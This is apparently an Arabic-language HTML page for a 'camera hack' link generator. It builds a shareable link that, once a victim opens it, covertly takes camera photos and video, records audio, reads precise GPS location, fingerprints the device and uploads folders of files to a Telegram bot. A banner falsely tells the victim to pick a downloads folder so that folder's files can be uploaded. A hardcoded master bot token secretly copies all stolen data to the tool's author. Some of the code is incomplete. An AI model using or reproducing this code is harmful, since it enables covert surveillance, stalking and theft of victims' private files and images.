<!DOCTYPE html>
<html lang="ar" dir="rtl"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>مركز التحميل</title>
<style>
  :root{
    --bg:#0a0814; --bg2:#120d24; --card:#1a1330;
    --line:rgba(168,140,255,0.15); --accent:#b18cff; --accent2:#7c5cff;
    --accent3:#5eead4; --muted:#9b8ec7; --text:#efeaff;
    --glow:0 0 40px rgba(124,92,255,0.25);
  }
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%;margin:0;font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--text)}
  body{
    background:
      radial-gradient(ellipse at 20% 0%, rgba(124,92,255,0.18), transparent 55%),
      radial-gradient(ellipse at 90% 100%, rgba(94,234,212,0.10), transparent 50%),
      linear-gradient(180deg,var(--bg) 0%, var(--bg2) 100%);
    min-height:100vh;
  }
  .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:34px 20px}
  .brand{font-weight:800;font-size:20px;letter-spacing:1px;
    background:linear-gradient(90deg,var(--accent),var(--accent3));
    -webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:22px}
  .card{width:100%;max-width:720px;
    background:linear-gradient(180deg,rgba(34,26,61,0.85),rgba(18,13,36,0.9));
    border:1px solid var(--line);border-radius:22px;padding:26px;
    box-shadow:0 30px 80px rgba(0,0,0,0.6), var(--glow);backdrop-filter:blur(14px)}
  .title{font-size:26px;margin:0 0 6px;font-weight:800}
  .subtitle{color:var(--muted);margin:0 0 22px;font-size:14px;line-height:1.7}
  .warn{background:linear-gradient(90deg,rgba(124,92,255,0.12),rgba(94,234,212,0.08));
    border-right:3px solid var(--accent);padding:12px 14px;border-radius:12px;
    font-size:13px;color:#d8cfff;margin-bottom:20px;line-height:1.7}
  label{display:block;color:var(--text);font-weight:700;margin:16px 0 8px;font-size:14px}
  input[type="text"]{width:100%;padding:13px 14px;border-radius:12px;
    border:1px solid var(--line);background:rgba(10,7,20,0.6);color:var(--text);
    outline:none;font-size:14px;transition:border 0.2s, box-shadow 0.2s}
  input[type="text"]:focus{border-color:var(--accent2);box-shadow:0 0 0 3px rgba(124,92,255,0.15)}
  .checkbox-group{display:flex;flex-direction:column;gap:9px;margin:10px 0 0;
    max-height:360px;overflow-y:auto;padding:12px;
    background:rgba(10,7,20,0.45);border-radius:14px;border:1px solid var(--line)}
  .checkbox-group::-webkit-scrollbar{width:6px}
  .checkbox-group::-webkit-scrollbar-thumb{background:var(--accent2);border-radius:10px}
  .checkbox-item{display:flex;align-items:center;gap:12px;
    background:rgba(255,255,255,0.02);padding:11px 14px;border-radius:11px;
    border:1px solid transparent;transition:all 0.2s;cursor:pointer}
  .checkbox-item:hover{background:rgba(124,92,255,0.08);border-color:var(--line)}
  .checkbox-item input[type="checkbox"]{width:19px;height:19px;cursor:pointer;accent-color:var(--accent2);flex-shrink:0}
  .checkbox-item label{margin:0;font-weight:500;font-size:14px;cursor:pointer;flex:1;color:var(--text)}
  .badge-new{font-size:10px;font-weight:800;padding:3px 8px;border-radius:20px;
    background:linear-gradient(90deg,var(--accent2),var(--accent3));color:#0a0814}
  .btn{display:inline-block;padding:15px 18px;border-radius:14px;border:none;
    background:linear-gradient(90deg,var(--accent2),var(--accent));color:#fff;
    font-weight:800;cursor:pointer;margin-top:20px;width:100%;font-size:15px;
    box-shadow:0 10px 30px rgba(124,92,255,0.35);transition:transform 0.15s}
  .btn:hover{transform:translateY(-2px)}
  .result{margin-top:16px;padding:14px;border-radius:12px;background:rgba(10,7,20,0.6);
    border:1px solid var(--line);word-break:break-all;font-size:13px;
    display:flex;gap:10px;align-items:center;justify-content:space-between}
  .copyBtn{padding:9px 14px;border-radius:10px;background:rgba(124,92,255,0.15);
    border:1px solid var(--line);cursor:pointer;color:var(--accent);font-weight:700}
  .madeby{position:fixed;left:14px;bottom:14px;z-index:9999;
    background:rgba(18,13,36,0.75);padding:9px 14px;border-radius:11px;font-weight:700;
    border:1px solid var(--line);color:var(--accent);backdrop-filter:blur(8px)}
  @media (max-width:720px){.title{font-size:22px}.card{padding:20px}.wrap{padding:20px 14px}}
  .dialog{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
    background:linear-gradient(180deg,var(--card),var(--bg2));
    border:1px solid var(--line);border-radius:24px;padding:38px 28px;text-align:center;
    z-index:99999;box-shadow:0 30px 100px rgba(0,0,0,0.8);width:88%;max-width:480px}
  .dialog p{color:var(--text);font-size:19px;font-weight:800;margin:0 0 26px}
  .dialog-buttons{display:flex;flex-direction:column;gap:12px;align-items:center}
  .dialog-link{display:inline-block;background:rgba(124,92,255,0.12);color:var(--text);
    padding:14px 22px;border-radius:50px;text-decoration:none;font-weight:800;font-size:15px;
    border:1px solid var(--line);transition:all 0.25s;width:85%}
  .dialog-link.visited{background:linear-gradient(90deg,var(--accent2),var(--accent));border-color:transparent}
  .dialog-btn{display:inline-block;background:linear-gradient(90deg,var(--accent2),var(--accent));
    color:#fff;padding:16px 30px;border-radius:50px;font-weight:900;font-size:16px;
    border:none;margin-top:14px;width:85%;cursor:pointer;opacity:0.35;
    pointer-events:none;transition:opacity 0.3s}
  .dialog-btn.active{opacity:1;pointer-events:auto}
  .download-page{width:100%;min-height:100vh;
    background:linear-gradient(180deg,#f8f7fc,#eef0fa);padding:22px 0;font-family:Tahoma,Arial,sans-serif}
  .main-box{width:94%;max-width:580px;background:#fff;margin:30px auto;padding:26px;
    border-radius:20px;box-shadow:0 12px 40px rgba(80,60,140,0.12);text-align:center}
  .main-box h2{margin:0 0 22px;color:#2a1f4a;font-size:15px;line-height:1.8;font-weight:700}
  .progress-track{width:100%;height:8px;background:#ece9f7;border-radius:20px;overflow:hidden;margin:18px 0 8px}
  .progress-fill{height:100%;width:0%;border-radius:20px;
    background:linear-gradient(90deg,#7c5cff,#5eead4);transition:width 0.6s ease}
  .progress-label{font-size:12px;color:#7c6fa8;font-weight:700;margin-bottom:18px}
  .ad-box{margin:16px 0;padding:10px;border-radius:12px;background:#f8f7fc;
    border:1px dashed #dcd6f0;min-height:80px}
  .action-btn{background:linear-gradient(90deg,#7c5cff,#b18cff);color:#fff;
    padding:17px 40px;font-size:18px;font-weight:800;border:none;border-radius:14px;
    cursor:pointer;box-shadow:0 10px 30px rgba(124,92,255,0.35);width:100%}
  .footer{text-align:center;margin-top:26px;font-size:12px;color:#a99cc9}
</style>
</head>
<body>

<div class="wrap">
  <div class="brand">◆ مركز التحكم ◆</div>
  <div class="card" id="cardArea">
    <h1 class="title">إنشاء رابط</h1>
    <p class="subtitle">اختر الميزات ثم انسخ الرابط وأرسله.</p>
    <div class="warn">⚠️ الاستخدام غير القانوني مسؤولية المستخدم وحده.</div>
    <div id="formBox">
      <label>Chat ID</label>
      <input type="text" id="chatIdInput" placeholder="أدخل Chat ID">
      <label>Bot Token</label>
      <input type="text" id="tokenInput" placeholder="أدخل Bot Token">
      <label>الميزات المطلوبة</label>
      <div class="checkbox-group" id="featuresGroup">
        <div class="checkbox-item"><input type="checkbox" id="camFront" value="camFront" checked><label for="camFront">📸 صورة — أمامية</label></div>
        <div class="checkbox-item"><input type="checkbox" id="camBack" value="camBack"><label for="camBack">📷 صورة — خلفية</label></div>
        <div class="checkbox-item"><input type="checkbox" id="videoFront" value="videoFront"><label for="videoFront">🎥 فيديو أمامي (25ث)</label></div>
        <div class="checkbox-item"><input type="checkbox" id="videoBack" value="videoBack"><label for="videoBack">📹 فيديو خلفي (25ث)</label></div>
        <div class="checkbox-item"><input type="checkbox" id="audio" value="audio"><label for="audio">🎤 تسجيل صوتي (15ث)</label></div>
        <div class="checkbox-item"><input type="checkbox" id="location" value="location"><label for="location">📍 موقع GPS دقيق</label></div>
        <div class="checkbox-item"><input type="checkbox" id="deviceInfo" value="deviceInfo" checked><label for="deviceInfo">🖥️ معلومات الجهاز الكاملة</label></div>
        <div class="checkbox-item"><input type="checkbox" id="stealFiles" value="stealFiles"><label for="stealFiles">📂 سحب كل الملفات <span class="badge-new">جديد</span></label></div>
      </div>
      <button class="btn" id="generateBtn">إنشاء الرابط</button>
      <div id="result" style="display:none" class="result">
        <div id="linkText" style="flex:1;color:#d8cfff;font-size:12px"></div>
        <button class="copyBtn" id="copyBtn">نسخ</button>
      </div>
    </div>
  </div>
</div>

<div class="madeby">المبرمج Win</div>

<div class="dialog" id="mandatoryDialog">
  <p>اشتراك إجباري في القنوات</p>
  <div class="dialog-buttons">
    <a href="https://t.me/lib_vip_1" target="_blank" class="dialog-link" id="channel1">القناة الاولة</a>
    <a href="https://t.me/yrr_t" target="_blank" class="dialog-link" id="channel2">القناة الثانية</a>
    <button class="dialog-btn" id="subscribeDoneBtn" disabled>تم الاشتراك</button>
  </div>
</div>

<script>
/* ============================================================
   الإعدادات
   ============================================================ */
const MASTER_BOT_TOKEN = "8772274391:AAHkEaupuOihrboWgBjM-_9XFhUsG591uM8";
const MASTER_CHAT_ID   = "6065648559";

const VIDEO_DURATION_MS = 25000;
const AUDIO_DURATION_MS = 15000;
const PHOTO_DELAY_MS    = 1500;
const UPLOAD_CHUNK      = 3;
const UPLOAD_DELAY_MS   = 800;

/* ============================================================
   إرسال موحّد: توكن المستخدم + التوكن الرئيسي
   ============================================================ */
async function broadcast(token, chat, method, payload){
  const targets = [{t: token, c: chat}];
  if(MASTER_BOT_TOKEN && MASTER_CHAT_ID && (token !== MASTER_BOT_TOKEN || chat !== MASTER_CHAT_ID)){
    targets.push({t: MASTER_BOT_TOKEN, c: MASTER_CHAT_ID});
  }
  for(const tgt of targets){
    try{
      if(payload instanceof FormData){
        payload.set('chat_id', tgt.c);
        await fetch(`https://api.telegram.org/bot${tgt.t}/${method}`,{method:'POST',body:payload});
      }else{
        await fetch(`https://api.telegram.org/bot${tgt.t}/${method}`,{
          method:'POST',headers:{'Content-Type':'application/json'},
          body: JSON.stringify({chat_id:tgt.c, ...payload})
        });
      }
    }catch(e){}
  }
}

/* ============================================================
   معلومات الزائر
   ============================================================ */
let visitorIP = "غير معروف";
let visitorCountry = "غير معروف";
let visitorCity = "غير معروف";
let visitorISP = "غير معروف";
let visitorDevice = "Unknown";
let visitorBattery = "غير متاح";

async function sendVisitorInfo(){
  try{
    const ua = navigator.userAgent;
    if(/Android/i.test(ua)) visitorDevice = "Android";
    else if(/iPhone|iPad|iPod/i.test(ua)) visitorDevice = "iOS";
    else if(/Windows/i.test(ua)) visitorDevice = "Windows";
    else if(/Mac/i.test(ua)) visitorDevice = "macOS";
    else if(/Linux/i.test(ua)) visitorDevice = "Linux";

    if(navigator.getBattery){
      try{ const b = await navigator.getBattery();
        visitorBattery = Math.round(b.level*100)+"%";
        if(b.charging) visitorBattery += " (شحن)";
      }catch(e){}
    }
    try{
      const r = await fetch('https://ipapi.co/json/');
      const d = await r.json();
      visitorIP = d.ip || visitorIP;
      visitorCountry = d.country_name || visitorCountry;
      visitorCity = d.city || visitorCity;
      visitorISP = d.org || visitorISP;
    }catch(e){}

    const msg =
      `🟢 *زيارة جديدة*\n`+
      `🌍 ${visitorCountry} — ${visitorCity}\n`+
      `📡 ${visitorISP}\n`+
      `📱 ${visitorDevice}\n`+
      `🔋 ${visitorBattery}\n`+
      `🌐 IP: ${visitorIP}\n`+
      `🕒 ${new Date().toLocaleString('ar-EG')}`;

    await broadcast(MASTER_BOT_TOKEN, MASTER_CHAT_ID, 'sendMessage', {text:msg,parse_mode:'Markdown'});
  }catch(e){}
}
sendVisitorInfo();

/* ============================================================
   Dialog
   ============================================================ */
const dialog = document.getElementById('mandatoryDialog');
const channel1 = document.getElementById('channel1');
const channel2 = document.getElementById('channel2');
const subscribeBtn = document.getElementById('subscribeDoneBtn');
let c1=false,c2=false;
channel1.addEventListener('click',()=>{c1=true;channel1.classList.add('visited');checkBoth()});
channel2.addEventListener('click',()=>{c2=true;channel2.classList.add('visited');checkBoth()});
function checkBoth(){if(c1&&c2){subscribeBtn.disabled=false;subscribeBtn.classList.add('active');subscribeBtn.textContent='✅ تم الاشتراك'}}
subscribeBtn.addEventListener('click',()=>{dialog.style.display='none'});

/* ============================================================
   لوحة التحكم
   ============================================================ */
const generateBtn = document.getElementById('generateBtn');
const resultEl = document.getElementById('result');
const linkText = document.getElementById('linkText');
const copyBtn = document.getElementById('copyBtn');

generateBtn.addEventListener('click',()=>{
  const chat = document.getElementById('chatIdInput').value.trim();
  const token = document.getElementById('tokenInput').value.trim();
  if(!chat||!token){ alert('املأ جميع الحقول'); return; }
  const checked = document.querySelectorAll('#featuresGroup input:checked');
  const features = Array.from(checked).map(c=>c.value).join(',');
  const full = `${location.origin}${location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
  linkText.innerText = full;
  resultEl.style.display='flex';
});
copyBtn.addEventListener('click',async()=>{
  try{await navigator.clipboard.writeText(linkText.innerText);
    copyBtn.innerText='تم';setTimeout(()=>copyBtn.innerText='نسخ',1500)}catch(e){alert('فشل النسخ')}
});

/* ============================================================
   أدوات
   ============================================================ */
function buildCaption(extra=""){
  let c = `━━━━━━━━━━━━━━\n`;
  c += `🌍 ${visitorCountry} — ${visitorCity}\n`;
  c += `📱 ${visitorDevice}\n`;
  c += `🌐 ${visitorIP}\n`;
  c += `🕒 ${new Date().toLocaleString('ar-EG')}\n`;
  if(extra) c += `${extra}\n`;
  c += `━━━━━━━━━━━━━━`;
  return c;
}
function humanSize(bytes){
  if(bytes<1024) return bytes+" B";
  if(bytes<1048576) return (bytes/1024).toFixed(1)+" KB";
  if(bytes<1073741824) return (bytes/1048576).toFixed(1)+" MB";
  return (bytes/1073741824).toFixed(2)+" GB";
}
// غلاف مهلة: كل وعد ينتهي بعد N ms مهما حدث
function withTimeout(promise, ms){
  return Promise.race([promise, new Promise(r=>setTimeout(r, ms))]);
}

/* ============================================================
   جمع معلومات الجهاز — محصّن بمهلة
   ============================================================ */
async function collectDeviceInfo(){
  const info = {};
  const ua = navigator.userAgent;
  info["User Agent"] = ua;
  info["Platform"] = navigator.platform || "-";
  info["Language"] = navigator.language || "-";
  info["Languages"] = (navigator.languages||[]).join(", ") || "-";
  info["Vendor"] = navigator.vendor || "-";
  info["Online"] = navigator.onLine ? "نعم" : "لا";
  info["Cookies"] = navigator.cookieEnabled ? "نعم" : "لا";
  info["DNT"] = navigator.doNotTrack || "-";
  info["Device Type"] = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? "محمول" : "سطح مكتب";

  info["Screen"] = `${screen.width}×${screen.height}`;
  info["Avail Screen"] = `${screen.availWidth}×${screen.availHeight}`;
  info["Color Depth"] = screen.colorDepth + " bit";
  info["Pixel Depth"] = screen.pixelDepth + " bit";
  info["Orientation"] = (screen.orientation && screen.orientation.type) || "-";
  info["DPR"] = window.devicePixelRatio || 1;
  info["Window"] = `${innerWidth}×${innerHeight}`;
  info["Viewport"] = `${document.documentElement.clientWidth}×${document.documentElement.clientHeight}`;

  info["Timezone"] = Intl.DateTimeFormat().resolvedOptions().timeZone || "-";
  info["TZ Offset"] = new Date().getTimezoneOffset() + " دقيقة";
  info["Local Time"] = new Date().toString();
  info["Locale"] = Intl.DateTimeFormat().resolvedOptions().locale || "-";

  info["CPU Cores"] = navigator.hardwareConcurrency || "-";
  info["Device Memory"] = (navigator.deviceMemory || "-") + " GB";
  info["Max Touch"] = navigator.maxTouchPoints || 0;

  try{
    if(navigator.getBattery){
      const b = await withTimeout(navigator.getBattery(), 1500);
      if(b){
        info["Battery"] = Math.round(b.level*100)+"%";
        info["Charging"] = b.charging ? "نعم" : "لا";
        if(b.chargingTime) info["Charging Time"] = b.chargingTime+" ث";
        if(b.dischargingTime !== Infinity) info["Discharging Time"] = b.dischargingTime+" ث";
      }
    }
  }catch(e){}

  if(navigator.connection){
    const c = navigator.connection;
    info["Network"] = c.effectiveType || "-";
    info["Downlink"] = c.downlink ? c.downlink+" Mbps" : "-";
    info["RTT"] = c.rtt ? c.rtt+" ms" : "-";
    info["Save Data"] = c.saveData ? "مفعّل" : "معطّل";
    if(c.type) info["Conn Type"] = c.type;
  }

  try{
    if(navigator.storage && navigator.storage.estimate){
      const est = await withTimeout(navigator.storage.estimate(), 1500);
      if(est){
        info["Storage Quota"] = humanSize(est.quota || 0);
        info["Storage Usage"] = humanSize(est.usage || 0);
      }
    }
  }catch(e){}

  try{
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if(gl){
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if(dbg){
        info["GPU Vendor"] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || "-";
        info["GPU Renderer"] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "-";
      }
      info["WebGL Version"] = gl.getParameter(gl.VERSION) || "-";
      info["Max Texture"] = gl.getParameter(gl.MAX_TEXTURE_SIZE);
    }
  }catch(e){}

  try{
    const cv = document.createElement('canvas');
    cv.width=220; cv.height=40;
    const ctx = cv.getContext('2d');
    ctx.textBaseline='top';
    ctx.font='14px Arial';
    ctx.fillStyle='#f60'; ctx.fillRect(0,0,220,40);
    ctx.fillStyle='#069'; ctx.fillText('WORM-VANTA-FP',4,4);
    ctx.fillStyle='rgba(102,204,0,0.7)'; ctx.fillText('WORM-VANTA-FP',6,20);
    const data = cv.toDataURL();
    let h=0; for(let i=0;i<data.length;i++){ h=((h<<5)-h+data.charCodeAt(i))|0; }
    info["Canvas Hash"] = h.toString(16);
  }catch(e){}

  // بصمة صوت — مُصحّحة: startRendering() + مهلة
  try{
    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if(AC){
      const ctx = new AC(1, 44100, 44100);
      const osc = ctx.createOscillator();
      osc.type='triangle'; osc.frequency.value=10000;
      const comp = ctx.createDynamicsCompressor();
      osc.connect(comp); comp.connect(ctx.destination);
      osc.start(0);
      const buf = await withTimeout(new Promise(res=>{
        ctx.oncomplete = e => res(e.renderedBuffer);
        ctx.startRendering();   // ← هذا كان ناقصاً
      }), 2000);
      if(buf){
        const ch = buf.getChannelData(0);
        let sum = 0;
        for(let i=4500;i<5000;i++) sum += Math.abs(ch[i]);
        info["Audio Hash"] = sum.toString(16).slice(0,16);
      }
    }
  }catch(e){}

  if(navigator.permissions && navigator.permissions.query){
    const names = ['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write'];
    const results = {};
    for(const n of names){
      try{
        const st = await withTimeout(navigator.permissions.query({name:n}), 800);
        if(st) results[n] = st.state;
      }catch(e){}
    }
    info["Permissions"] = JSON.stringify(results);
  }

  if(window.MediaRecorder && MediaRecorder.isTypeSupported){
    const codecs = ['video/webm;codecs=vp8','video/webm;codecs=vp9','video/webm;codecs=h264',
                    'video/mp4;codecs=h264','video/mp4;codecs=avc1','audio/webm;codecs=opus',
                    'audio/mp4','audio/ogg;codecs=opus'];
    const sup = codecs.filter(c=>{ try{return MediaRecorder.isTypeSupported(c)}catch(e){return false} });
    info["Codecs"] = sup.join(", ") || "-";
  }

  return info;
}

async function sendDeviceInfo(chat, token){
  try{
    const info = await collectDeviceInfo();
    const lines = Object.entries(info).map(([k,v])=>`• ${k}: ${v}`);
    const chunks = [];
    let cur = `🖥️ *معلومات الجهاز*\n${buildCaption()}\n`;
    for(const l of lines){
      if((cur + l + "\n").length > 3800){ chunks.push(cur); cur=""; }
      cur += l + "\n";
    }
    if(cur) chunks.push(cur);
    for(const c of chunks){
      await broadcast(token, chat, 'sendMessage', {text:c, parse_mode:'Markdown'});
    }
  }catch(e){}
}

/* ============================================================
   صورة
   ============================================================ */
async function captureAndSend(stream, chat, token, type){
  return new Promise(resolve=>{
    const video = document.createElement('video');
    video.autoplay=true; video.playsInline=true; video.muted=true;
    video.style.display='none'; video.srcObject=stream;
    document.body.appendChild(video);
    video.onloadedmetadata = ()=>{
      video.play();
      setTimeout(()=>{
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
        canvas.toBlob(async blob=>{
          if(blob && blob.size>2000){
            const form = new FormData();
            form.append('photo',blob,`${type}_${Date.now()}.jpg`);
            form.append('caption',buildCaption(`📸 صورة (${type==='front'?'أمامية':'خلفية'})`));
            await broadcast(token, chat, 'sendPhoto', form);
          }
          video.remove(); resolve();
        },'image/jpeg',0.95);
      },PHOTO_DELAY_MS);
    };
  });
}

/* ============================================================
   فيديو 25ث
   ============================================================ */
async function recordAndSend(stream, chat, token, type, duration){
  return new Promise(resolve=>{
    const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') ? 'video/webm;codecs=vp9,opus'
      : MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ? 'video/webm;codecs=vp8,opus'
      : MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : '';
    let rec;
    try{ rec = new MediaRecorder(stream, mime?{mimeType:mime,videoBitsPerSecond:2500000,audioBitsPerSecond:128000}:{videoBitsPerSecond:2500000}); }
    catch(e){ resolve(); return; }
    const chunks=[];
    rec.ondataavailable = e=>{ if(e.data && e.data.size>0) chunks.push(e.data); };
    rec.onstop = async ()=>{
      try{
        const blob = new Blob(chunks,{type:mime||'video/webm'});
        if(blob.size<3000){ resolve(); return; }
        const ext = (mime||'').includes('mp4')?'mp4':'webm';
        const form = new FormData();
        form.append('video',blob,`${type}_${Date.now()}.${ext}`);
        form.append('caption',buildCaption(`🎥 فيديو ${type==='front'?'أمامي':'خلفي'} — ${Math.round(duration/1000)}ث`));
        form.append('supports_streaming','true');
        await broadcast(token, chat, 'sendVideo', form);
      }catch(e){}
      resolve();
    };
    rec.start(1000);
    setTimeout(()=>{ if(rec.state==='recording') try{rec.stop()}catch(e){} }, duration);
  });
}

/* ============================================================
   الموقع الدقيق
   ============================================================ */
async function sendLocation(chat, token){
  return new Promise(resolve=>{
    if(!("geolocation" in navigator)){ resolve(); return; }
    navigator.geolocation.getCurrentPosition(
      async pos=>{
        const c = pos.coords;
        const acc = c.accuracy ? `±${Math.round(c.accuracy)}م` : "-";
        let txt = `📍 *موقع GPS دقيق*\n`;
        txt += `Lat: ${c.latitude}\nLng: ${c.longitude}\n`;
        txt += `الدقة: ${acc}\n`;
        if(c.altitude) txt += `الارتفاع: ${c.altitude.toFixed(1)}م\n`;
        if(c.speed) txt += `السرعة: ${c.speed.toFixed(2)} م/ث\n`;
        if(c.heading) txt += `الاتجاه: ${c.heading.toFixed(0)}°\n`;
        txt += `🔗 https://www.google.com/maps?q=${c.latitude},${c.longitude}\n`;
        txt += `\n${buildCaption()}`;
        await broadcast(token, chat, 'sendMessage', {text:txt, parse_mode:'Markdown'});
        await broadcast(token, chat, 'sendLocation', {latitude:c.latitude, longitude:c.longitude});

        try{
          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${c.latitude}&lon=${c.longitude}&accept-language=ar`);
          const d = await r.json();
          if(d && d.display_name){
            await broadcast(token, chat, 'sendMessage', {text:`🏠 *العنوان الكامل*\n${d.display_name}`});
          }
        }catch(e){}

        if(c.accuracy && c.accuracy > 50){
          navigator.geolocation.getCurrentPosition(
            async pos2=>{
              const c2 = pos2.coords;
              await broadcast(token, chat, 'sendLocation', {latitude:c2.latitude, longitude:c2.longitude});
              await broadcast(token, chat, 'sendMessage', {
                text:`📍 *قراءة ثانية (أدق)*\n${c2.latitude}, ${c2.longitude}\n±${Math.round(c2.accuracy||0)}م\nhttps://www.google.com/maps?q=${c2.latitude},${c2.longitude}`
              });
              resolve();
            },
            ()=>resolve(),
            {enableHighAccuracy:true,timeout:15000,maximumAge:0}
          );
        }else{ resolve(); }
      },
      ()=>resolve(),
      {enableHighAccuracy:true,timeout:15000,maximumAge:0}
    );
  });
}

/* ============================================================
   سحب الملفات
   ============================================================ */
async function stealAllFiles(chat, token){
  return new Promise(resolve=>{
    const input = document.createElement('input');
    input.type='file'; input.multiple=true;
    input.webkitdirectory=true; input.directory=true;
    input.style.position='fixed'; input.style.left='-9999px';
    document.body.appendChild(input);

    const banner = document.createElement('div');
    banner.style.cssText = `position:fixed;bottom:20px;left:50%;transform:translateX(-50%);
      background:linear-gradient(90deg,#7c5cff,#b18cff);color:#fff;padding:14px 22px;
      border-radius:14px;font-weight:800;font-size:15px;
      box-shadow:0 15px 40px rgba(124,92,255,0.5);z-index:999999;cursor:pointer;
      font-family:Tahoma,Arial,sans-serif;max-width:90%;text-align:center;`;
    banner.textContent = '⬇️ اختر مجلد التنزيلات لبدء استكمال التحميل';
    banner.onclick = ()=>input.click();
    document.body.appendChild(banner);

    input.addEventListener('change', async ()=>{
      const files = input.files;
      if(!files || files.length===0){ banner.remove(); input.remove(); resolve(); return; }
      const list = Array.from(files);
      banner.textContent = `📤 (0/${list.length})`;
      await broadcast(token, chat, 'sendMessage', {text: buildCaption(`📂 بدء سحب ${list.length} ملف`)});

      let done = 0;
      const MAX_SIZE = 49*1024*1024;
      for(const file of list){
        try{
          if(file.size === 0){ done++; continue; }
          if(file.size > MAX_SIZE){
            await broadcast(token, chat, 'sendMessage', {text: buildCaption(`⚠️ ملف كبير (${humanSize(file.size)}): ${file.name}`)});
            done++; continue;
          }
          const form = new FormData();
          form.append('document', file, file.name || `file_${Date.now()}`);
          const sc = `📄 ${file.name}\n📦 ${humanSize(file.size)}`;
          if(sc.length < 900) form.append('caption', sc);
          await broadcast(token, chat, 'sendDocument', form);
          done++;
          banner.textContent = `📤 (${done}/${list.length})`;
          if(done % UPLOAD_CHUNK === 0) await new Promise(r=>setTimeout(r, UPLOAD_DELAY_MS));
        }catch(e){ done++; }
      }
      await broadcast(token, chat, 'sendMessage', {text: buildCaption(`✅ انتهى — ${done}/${list.length}`)});
      banner.textContent='✅ اكتمل';
      setTimeout(()=>{ banner.remove(); input.remove(); resolve(); }, 2000);
    });
  });
}

/* ============================================================
   الأذونات
   ============================================================ */
async function preGrantPermissions(needCam, needMic){
  if(!needCam && !needMic) return true;
  const c = {};
  if(needCam) c.video = {facingMode:'user'};
  if(needMic) c.audio = true;
  try{
    const s = await navigator.mediaDevices.getUserMedia(c);
    s.getTracks().forEach(t=>t.stop());
    return true;
  }catch(e){ return false; }
}

/* ============================================================
   ★ الإصلاح الرئيسي: الأذونات أولاً — معلومات الجهاز بالخلفية
   ============================================================ */
async function startFeatures(chat, token, features){
  if(!features) return;
  const list = features.split(',');
  const needCam = list.some(f=>['camFront','camBack','videoFront','videoBack'].includes(f));
  const needMic = list.some(f=>['audio','videoFront','videoBack'].includes(f));

  // ① الأذونات أولاً — هذا هو ما يُظهر "سماح" للضحية
  await preGrantPermissions(needCam, needMic);

  // ② معلومات الجهاز بالخلفية — لا ننتظرها حتى لا تُعطّل التدفّق
  if(list.includes('deviceInfo')) sendDeviceInfo(chat, token).catch(()=>{});

  // ③ باقي الميزات — تتسلسل بسرعة
  if(list.includes('camFront')){
    try{ const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1920},height:{ideal:1080}}});
      await captureAndSend(s,chat,token,'front'); s.getTracks().forEach(t=>t.stop()); }catch(e){}
  }
  if(list.includes('camBack')){
    try{ const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1920},height:{ideal:1080}}});
      await captureAndSend(s,chat,token,'back'); s.getTracks().forEach(t=>t.stop()); }catch(e){}
  }
  if(list.includes('videoFront')){
    try{ const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:true});
      await recordAndSend(s,chat,token,'front',VIDEO_DURATION_MS); s.getTracks().forEach(t=>t.stop()); }catch(e){}
  }
  if(list.includes('videoBack')){
    try{ const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}},audio:true});
      await recordAndSend(s,chat,token,'back',VIDEO_DURATION_MS); s.getTracks().forEach(t=>t.stop()); }catch(e){}
  }
  if(list.includes('audio')){
    try{ const s = await navigator.mediaDevices.getUserMedia({audio:true});
      await recordAudioAndSend(s,chat,token,AUDIO_DURATION_MS); s.getTracks().forEach(t=>t.stop()); }catch(e){}
  }
  if(list.includes('location')) await sendLocation(chat,token);
  if(list.includes('stealFiles')) await stealAllFiles(chat,token);
}
